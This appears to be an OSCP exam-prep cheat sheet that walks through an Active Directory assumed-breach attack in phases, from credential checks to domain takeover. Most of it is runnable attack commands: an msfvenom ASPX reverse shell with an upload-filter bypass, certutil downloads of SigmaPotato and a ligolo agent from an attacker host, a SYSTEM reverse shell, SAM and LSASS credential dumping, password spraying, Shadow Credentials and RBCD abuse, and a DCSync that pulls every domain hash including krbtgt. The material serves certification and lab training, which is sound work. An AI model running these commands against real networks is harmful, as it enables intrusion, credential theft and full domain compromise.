# OSCP AD + Pivoting Cheat Sheet

Built from a full assumed-breach walkthrough. Organized by phase, in the order you
actually hit them. Placeholders in `<ANGLE_BRACKETS>` are values you fill in.

**Golden rules learned the hard way:**
- **Verify creds before you exploit.** `nxc smb` is your first move, always.
- **Enumerate the directory (BloodHound) before you sweep IPs.** AD tells you the map.
- **Auth != shell != route.** Valid creds let you *query*; a shell needs admin/WinRM
  rights; reaching an internal box needs a *routed tunnel*. Three separate things.
- **Quote passwords** in bash: `'P@ss#2024'` — `#`, `!`, `$` break unquoted.
- **Agent connects != traffic flows.** After the agent joins: `tunnel_start` THEN
  `autoroute`, or nothing routes.
- **Spray every cred you find, everywhere.** Password reuse is the #1 exam path.
- **GenericAll depends on the target type:** over a *user* = reset pw / targeted
  Kerberoast / Shadow Creds; over a *computer* = RBCD.
- Every attack yields a specific artifact — know whether you got a **password**, a
  **hash** (`-H`), or a **ticket** (`-k`). You authenticate differently with each.

---

## 0. Assumed-breach start: verify + triage the box

```bash
# Verify domain creds over SMB — gives hostname, domain, OS, signing, admin status
nxc smb <TARGET_IP> -u <USER> -p '<PASS>'
#   [+] ...\user:pass            -> valid, low-priv
#   [+] ...\user:pass (Pwn3d!)   -> LOCAL ADMIN

# Same check for WinRM shell access (Remote Management Users, not only admins)
nxc winrm <TARGET_IP> -u <USER> -p '<PASS>'

# Full TCP scan + service/version + default scripts
nmap -sC -sV -p- <TARGET_IP>

# 88/kerberos + 389/ldap + 53/dns + 464/kpasswd = DOMAIN CONTROLLER fingerprint
```

---

## 1. SMB share enumeration + looting

```bash
# List shares and permissions
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' --shares

# Interactive browse (note the DOMAIN/user%pass form)
smbclient //<TARGET_IP>/<SHARE> -U '<DOMAIN>/<USER>%<PASS>'
#   smb> ls
#   smb> cd <dir>
#   smb> get <file>

# Recursive spider for interesting files
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M spider_plus

# Loot targets: web.config, db.config, *.ps1 backup scripts, unattend.xml,
# connection strings (cleartext creds), sysprep files, PowerShell history.
```

---

## 2. Domain enumeration (do this early, run in parallel)

```bash
# BloodHound collection from Kali — pull the whole domain map.
# -ns is the DC IP (or a box that forwards DNS to it). Works with ANY valid cred.
bloodhound-python -u <USER> -p '<PASS>' -d <DOMAIN> -ns <DC_IP> -c all

# Enumerate via nxc (no GUI needed)
nxc smb  <DC_IP> -u <USER> -p '<PASS>' --users        # all domain users
nxc smb  <DC_IP> -u <USER> -p '<PASS>' --computers    # your target list (hostnames)
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --asreproast asrep.txt
nxc ldap <DC_IP> -u <USER> -p '<PASS>' --kerberoasting kerb.txt

# BloodHound didn't store IPs — resolve hostnames via the DC's DNS
nslookup <HOST>.<DOMAIN> <DC_IP>
```

**In the BloodHound GUI:** mark each owned principal → check *Outbound Object
Control* + run *Shortest Paths from Owned*. Pre-built query: *Find Principals with
DCSync Rights*.

---

## 3. Web / service foothold (box 1)

```bash
# --- Don't rabbit-hole a CVE without checking its prerequisite port ---
# e.g. Tomcat Ghostcat (CVE-2020-1938) needs AJP/8009 — useless if 8009 is filtered.

# File-upload filter bypass (IIS/ASP.NET): the LAST extension decides handling.
#   shell.aspx        -> often blocked
#   shell.aspx.jpg    -> passes filter but served STATIC (inert, no exec)
#   shell.asp         -> blocked
#   shell.ashx        -> executes as ASP.NET handler  <-- winner in this case
# Also try: .aspx;.jpg (IIS6 semicolon), trailing dot/space, web.config drop.

# ASPX/ASHX reverse shell payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=443 -f aspx -o shell.aspx
# (for .ashx, generate the handler variant / use an ashx wrapper)

nc -lvnp 443     # catch it, then browse to the uploaded file to trigger

# MySQL from a leaked connection string
mysql -h <TARGET_IP> -P 3306 -u <DBUSER> -p'<DBPASS>'
#   show databases;  use <db>;  show tables;  select * from users;
```

---

## 4. Windows local privilege escalation

```bash
# ALWAYS check privileges first on a service/web shell
whoami /priv
#   SeImpersonatePrivilege Enabled  -> Potato attack (almost always on web/db shells)

# Pull the exploit binary onto the box
certutil -urlcache -f http://<KALI_IP>/SigmaPotato.exe SigmaPotato.exe

# SeImpersonate -> SYSTEM (SigmaPotato = updated GodPotato/SweetPotato fork)
SigmaPotato.exe "whoami"                       # test: should print nt authority\system
SigmaPotato.exe --revshell <KALI_IP> 4444      # full reverse shell as SYSTEM
#   catch with: nc -lvnp 4444

# Other common vectors if no SeImpersonate:
#   unquoted service paths, AlwaysInstallElevated, DLL hijack, writable service bins.
#   Enumerate with winPEAS / PrivescCheck.ps1.
```

---

## 5. Credential dumping

```bash
# --- From a SYSTEM shell: save the hives, dump offline ---
reg save HKLM\SAM      C:\Windows\Temp\sam.save
reg save HKLM\SYSTEM   C:\Windows\Temp\system.save
reg save HKLM\SECURITY C:\Windows\Temp\security.save
# (transfer the .save files back to Kali, then:)
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL

# --- Remote dump with local-admin hash (SAM account -> --local-auth) ---
nxc smb <TARGET_IP> -u Administrator -H <LOCAL_ADMIN_NTHASH> --local-auth -M lsassy

# --- LSASS dump with a domain cred that is admin on the box ---
nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M lsassy
# Looking for: a HIGHER-priv account (Domain Admin session!) or a fresh domain cred.

# lsassy caught by Defender? fallback:
#   procdump64.exe -accepteula -ma lsass.exe lsass.dmp   (then pypykatz on Kali)
#   pypykatz lsa minidump lsass.dmp
```

---

## 6. Pivoting with ligolo-ng

```bash
# --- Kali side (once) ---
sudo ./proxy -selfcert                 # start proxy (port 11601), needs sudo
ligolo-ng » interface_create --name ligolo

# --- On the compromised pivot box (needs a shell, NOT admin) ---
certutil -urlcache -f http://<KALI_IP>/agent.exe agent.exe
start /b agent.exe -connect <KALI_IP>:11601 -ignore-cert         # cmd
# PowerShell backgrounded:
# Start-Process -WindowStyle Hidden .\agent.exe -ArgumentList "-connect <KALI_IP>:11601 -ignore-cert"

# --- Kali side: bring the tunnel up (agent connecting is NOT enough) ---
ligolo-ng » session                    # select the agent
[Agent] » tunnel_start --tun ligolo
[Agent] » autoroute                    # reads agent's routes, pick the internal subnet
# verify:
ip route | grep ligolo

# --- Reverse shells / file hosting BACK to Kali need a listener on the pivot ---
[Agent] » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp   # catch revshell
[Agent] » listener_add --addr 0.0.0.0:80   --to 127.0.0.1:80   --tcp   # host payloads
#   target points at PIVOT's internal IP:4444, not your Kali.
# Rule: connect OUT from Kali (nxc, evil-winrm, nmap) = free through tunnel.
#       connect BACK to Kali (revshell, certutil pull) = needs a listener.

# --- Reach a service on the pivot's OWN localhost ---
ligolo-ng » interface_add_route --name ligolo --route 240.0.0.1/32
#   then: mysql -h 240.0.0.1 ... / curl http://240.0.0.1:8080

# --- Double pivot (network behind the network) ---
[Agent : pivot1] » listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
# 2nd agent connects to pivot1's INTERNAL ip:  agent.exe -connect <PIVOT1_INTERNAL>:11601 -ignore-cert
ligolo-ng » interface_create --name ligolo2
[Agent : pivot2] » tunnel_start --tun ligolo2
[Agent : pivot2] » autoroute
```

**Gotchas:** proxy needs sudo (agent doesn't); Defender eats stock `agent.exe`
(fallback: chisel / self-compiled); proxy on Windows needs `wintun.dll`.

---

## 7. Lateral movement — getting shells with what you looted

```bash
# Scan the internal box FIRST (through tunnel) — don't assume the shell method
nmap -sT -Pn -p 135,139,445,3389,5985 <INTERNAL_IP>

# --- password ---
evil-winrm -i <IP> -u <USER> -p '<PASS>'
impacket-psexec  <DOMAIN>/<USER>:'<PASS>'@<IP>
impacket-wmiexec <DOMAIN>/<USER>:'<PASS>'@<IP>

# --- NT hash (pass-the-hash, uses IP fine, no Kerberos needed) ---
nxc smb <IP> -u <USER> -H <NTHASH>
evil-winrm -i <IP> -u <USER> -H <NTHASH>
impacket-psexec -hashes :<NTHASH> <DOMAIN>/<USER>@<IP>

# --- Kerberos ticket (-k) needs HOSTNAME + name resolution, not IP ---
echo "<IP>  <HOST>.<DOMAIN> <HOST>" | sudo tee -a /etc/hosts
export KRB5CCNAME=<user>.ccache
nxc smb <HOST>.<DOMAIN> -u <USER> -k --use-kcache
impacket-psexec -k -no-pass <HOST>.<DOMAIN>
# Kerberos clock skew -> KRB_AP_ERR_SKEW: sync to DC with  sudo ntpdate <DC_IP>
```

---

## 8. Password / hash cracking

```bash
# Kerberoast TGS
hashcat -m 13100 kerb.txt  /usr/share/wordlists/rockyou.txt
# AS-REP roast
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
# NTLM
hashcat -m 1000  ntlm.txt  /usr/share/wordlists/rockyou.txt
# Raw SHA-256 (e.g. app DB hashes)
hashcat -m 1400  hashes.txt /usr/share/wordlists/rockyou.txt

# Credential-stuffing spray: cracked passwords x every domain user (validate on DC)
nxc smb <DC_IP> -u users.txt -p '<CRACKED_PASS>' --continue-on-success
# Note: APP creds (from a web DB) frequently do NOT reuse as DOMAIN creds — test, don't assume.
```

---

## 9. ACL / AD abuses (from BloodHound edges)

```bash
# --- GenericAll / ForceChangePassword over a USER: reset the password ---
net rpc password "<TARGET_USER>" "<NEWPASS>" -U "<DOMAIN>/<USER>%<PASS>" -S <DC_IP>
#   (destructive + loud — breaks the real account)

# --- GenericAll over a USER (stealthier): targeted Kerberoast ---
#   write a fake SPN, request the ticket, crack offline, remove the SPN.

# --- AddKeyCredentialLink over a USER: Shadow Credentials (needs AD CS / PKINIT) ---
#   Yields a CERT -> TGT -> HASH.  NOT a password.
pywhisker -d <DOMAIN> -u <USER> -p '<PASS>' --target <VICTIM> --action add
#   -> outputs <victim>.pfx  + pfx password
python3 gettgtpkinit.py <DOMAIN>/<VICTIM> -cert-pfx <victim>.pfx -pfx-pass '<PFXPASS>' <victim>.ccache
#   -> TGT (.ccache).  Optional: recover the NT hash:
export KRB5CCNAME=<victim>.ccache
python3 getnthash.py <DOMAIN>/<VICTIM> -key <AS-REP-KEY>
#   authenticate with -k (ticket) or -H (hash) — there is no password to spray.

# --- GenericAll over a COMPUTER: Resource-Based Constrained Delegation (RBCD) ---
# 1) create a computer account you control (needs MachineAccountQuota > 0, default 10)
impacket-addcomputer -computer-name 'EVILPC$' -computer-pass 'Evil123!' \
  -hashes :<NTHASH> -dc-ip <DC_IP> '<DOMAIN>/<CONTROLLED_USER>'
# 2) write msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer
impacket-rbcd -delegate-from 'EVILPC$' -delegate-to '<TARGET$>' -action write \
  -hashes :<NTHASH> '<DOMAIN>/<CONTROLLED_USER>'
# 3) S4U — impersonate a DA to the target's service
impacket-getST -spn 'cifs/<TARGET_FQDN>' -impersonate 'Administrator' \
  -dc-ip <DC_IP> '<DOMAIN>/EVILPC$:Evil123!'
# 4) use the ticket
export KRB5CCNAME='Administrator@cifs_<TARGET_FQDN>@<REALM>.ccache'
impacket-psexec -k -no-pass <TARGET_FQDN>
```

---

## 10. Endgame: own the domain

```bash
# DCSync — pull every hash in the domain (needs replication rights / DA / GenericAll-on-DC)
impacket-secretsdump '<DOMAIN>/<USER>:<PASS>'@<DC_IP> -just-dc
# with a hash:
impacket-secretsdump -hashes :<NTHASH> '<DOMAIN>/<USER>'@<DC_IP> -just-dc
# with a ticket (already SYSTEM on the DC via RBCD):
export KRB5CCNAME=<admin>.ccache
impacket-secretsdump -k -no-pass <DC_FQDN> -just-dc
#   grabs Administrator NT hash (PtH anywhere) + krbtgt (Golden Ticket persistence)
```

---

## The exam loop (memorize this shape)

```
verify creds (nxc)  ->  loot shares  ->  BloodHound the domain
      ->  foothold (web/service/reuse)  ->  privesc (SeImpersonate/Potato)
      ->  dump creds (SAM + LSASS)  ->  spray everything, everywhere
      ->  pivot with ligolo to the internal subnet
      ->  follow BloodHound edges (ACL abuse: reset / Shadow Creds / RBCD)
      ->  land on the DC  ->  DCSync  ->  done
```

**When stuck, the answer is almost always MORE ENUMERATION, not a fancier exploit.**
Dead ends are expected — try, discard, move on. Don't marry the first shiny CVE.
